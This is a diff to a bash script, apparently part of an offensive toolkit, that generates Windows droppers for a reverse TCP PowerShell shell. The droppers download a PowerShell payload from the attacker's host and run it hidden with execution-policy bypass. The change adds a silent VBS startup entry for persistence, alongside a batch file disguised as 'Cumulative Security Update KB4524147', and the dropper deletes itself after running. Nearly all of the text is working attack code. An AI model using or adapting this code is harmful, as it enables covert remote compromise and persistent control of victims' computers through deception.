@@ -12197,6 +12197,7 @@ sleep 2
 
 
 ## Store User Inputs (bash variable declarations)..
+easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
@@ -12258,13 +12259,20 @@ else
    echo "cmd /R echo Y | powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser" >> $IPATH/output/$Drop.bat
    echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
    echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
-   ## Persistence script updated to hidde the 'powershell execution command' (better persistence social engineering).
-   echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-   echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-   echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-   echo "echo PoWeRsHeLl Get-HotFix -Description 'Security Update' >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-   echo "echo timeout /T 2 ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-   echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+   ## Persistence script updated to hidde the 'powershell execution command'
+   # better persistence social engineering build
+   if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
+      ## Silent Agent execution (no terminal prompt) using VBS script.
+      echo "echo Set objShell = WScript.CreateObject(\"WScript.Shell\") > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo objShell.Run \"cmd /c PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1\", 0, True >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
+   else
+      echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo PoWeRsHeLl Get-HotFix -Description 'Security Update' >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo timeout /T 2 ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+   fi
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.bat" >> $IPATH/output/$Drop.bat # <-- delete script at the end of execution
 fi
 
@@ -12382,7 +12390,11 @@ if [ "$persistence" = "Add persistence)" ]; then
    echo "|EXECUTE THE FOLLOW COMMANDS ON TARGET CMD|" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "cmd /C echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/delete_persistence_$random_name.txt
-   echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/delete_persistence_$random_name.txt
+   if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
+      echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/delete_persistence_$random_name.txt
+   else
+      echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/delete_persistence_$random_name.txt
+   fi
    echo "del /F /Q \"$rpath\\$NaM.ps1\"" >> $IPATH/output/delete_persistence_$random_name.txt
    zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "REMARK: Instructions how to manualy delete persistence from target stored in:\n$IPATH/output/delete_persistence_$random_name.txt" --info > /dev/null 2>&1
 fi
@@ -12410,6 +12422,7 @@ sleep 2
 
 
 ## Store User Inputs (bash variable declarations)..
+easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
@@ -12483,13 +12496,20 @@ else
    echo "cmd /R echo Y | powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
-   ## Persistence script updated to hidde the 'powershell execution command' (better persistence social engineering).
-   echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-   echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-   echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-   echo "echo PoWeRsHeLl Get-HotFix >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-   echo "echo timeout /T 2 ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-   echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+   ## Persistence script updated to hidde the 'powershell execution command'
+   # better persistence social engineering build
+   if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
+      ## Silent Agent execution (no terminal prompt) using VBS script.
+      echo "echo Set objShell = WScript.CreateObject(\"WScript.Shell\") > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo objShell.Run \"cmd /c PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1\", 0, True >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
+   else
+      echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo PoWeRsHeLl Get-HotFix >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo timeout /T 2 ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+   fi
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script at the end of execution.
 fi
 
@@ -12589,7 +12609,11 @@ if [ "$persistence" = "Add persistence)" ]; then
    echo "|EXECUTE THE FOLLOW COMMANDS ON TARGET CMD|" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "cmd /C echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/delete_persistence_$random_name.txt
-   echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/delete_persistence_$random_name.txt
+   if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
+      echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/delete_persistence_$random_name.txt
+   else
+      echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/delete_persistence_$random_name.txt
+   fi
    echo "del /F /Q \"$rpath\\$NaM.ps1\"" >> $IPATH/output/delete_persistence_$random_name.txt
    zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "REMARK: Instructions how to manualy delete persistence from target stored in:\n$IPATH/output/delete_persistence_$random_name.txt" --info > /dev/null 2>&1
 fi
